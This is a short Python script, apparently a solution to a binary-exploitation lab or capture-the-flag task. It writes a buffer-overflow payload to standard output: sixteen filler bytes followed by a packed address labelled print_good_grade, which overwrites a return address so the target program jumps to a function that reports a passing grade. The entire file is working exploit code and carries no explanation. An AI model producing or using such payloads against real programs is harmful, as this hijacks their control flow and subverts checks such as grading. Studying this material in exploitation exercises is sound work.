import sys
import struct

print_good_grade = 0x8049a95

sys.stdout.buffer.write(b'a'*16 + struct.pack('<I',print_good_grade ))